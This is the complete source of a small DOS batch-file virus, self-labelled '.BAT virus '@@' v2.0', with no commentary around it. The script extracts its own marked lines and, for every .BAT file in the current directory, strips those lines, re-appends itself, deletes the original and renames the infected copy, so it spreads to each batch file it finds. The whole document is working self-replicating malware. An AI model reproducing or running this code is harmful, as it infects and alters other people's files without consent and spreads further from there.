dir
@echo off > @@
echo .BAT virus '@@' v2.0
goto L@@
if %1 == @@.BAT goto L@@@
type %1 | find /v "@@" > @@@
copy @@@+@@ > nul
del %1 > @@@@
ren @@@ %1 > nul
goto L@@@
:L@@
type %0.BAT | find "@@@" > @@.BAT
type %0.BAT | find "@@" > @@
for %%9 in (*.BAT) do call @@ %%9
del @@*.*
:L@@@
